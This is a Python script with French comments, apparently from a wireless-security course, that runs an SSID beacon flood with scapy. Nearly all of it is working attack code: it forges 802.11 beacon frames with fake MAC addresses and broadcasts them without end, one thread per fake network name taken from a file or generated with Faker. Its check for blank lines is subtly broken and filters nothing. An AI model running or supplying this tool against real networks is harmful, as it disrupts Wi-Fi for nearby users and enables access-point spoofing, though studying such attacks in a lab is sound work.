# Auteurs    : Dylan Canton & Christian Zaccaria
# Date       : 23.03.2022
# Descriptif : Script permettant de créer de faux SSID afin de créer du traffic
# Note       : Etant donné que le but est de pouvoir générer beaucoup de traffic, il est nécessaire
#              de fournir un fichier .txt contenant tous les noms qui seront crées. Ajouter les noms
#              en paramètre au script aurait donné comme conséquence d'écrire enormément de paramètres
#              en entrée au script. Néanmoins, il est possible d'ajouter un numéro comme argument afin 
#              de pouvoir générer des SSID aléatoires.
# Note2      : il est nécessaire d'installer faker (sudo pip3 install faker scapy) !!!!
# Entrée     : script3_ssidflood.py -i <INTERFACE_NAME> -f <TXT_FILENAME> ou <INT_NUMBER>
# Source     : https://www.thepythoncode.com/article/create-fake-access-points-scapy

from scapy.all import *
from threading import Thread
from faker import Faker
import sys
import argparse

ssid_list = []

# Param nécessaire (à remplir) permettant de lancer l'attaque
parser = argparse.ArgumentParser(prog="SSID FLOOD", description="SSID Flood attack")

parser.add_argument("-i", "--Interface", required=True, help="Interface who send attack")
parser.add_argument("-f", "--File", required=False, help="file with all SSID or Number of SSID to generate (not null and positive)")
tab_args = parser.parse_args()

interface = tab_args.Interface
try:
    file = int(tab_args.File)
except ValueError:
    file = tab_args.File


# génére et envoi de paquets afin de simuler un AP avec SSID et une fausse MAC adresse
def generate_send_beacon(ssid, mac, infinite=True):
    #forge le paquet avec dot11, le beacon et le SSID
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) 
    beacon = Dot11Beacon(cap="ESS+privacy") 
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) 
    pkt = RadioTap()/dot11/beacon/essid
    sendp(pkt, inter=0.1, loop=1, iface=interface, verbose=0)


#generation de SSID si aucun fichier n'est fourni en paramètre
if type(file) == int:
    for i in range(file):
        ssid_list.append(Faker().name())
#autrement on prend la liste fournie
else :
    file = open(file, "r")
    for line in file:
        # Evite de prendre des SSID avec un nom vide
        if line != "\r\n" or line != "" or line != "\n":
            ssid_list.append(line.rstrip())

# On démarre un thread pour chaque AP crée afin d'envoyer des paquets
for ssid_name in ssid_list:
    print(ssid_name)
    Thread(target=generate_send_beacon, args=(ssid_name, Faker().mac_address())).start()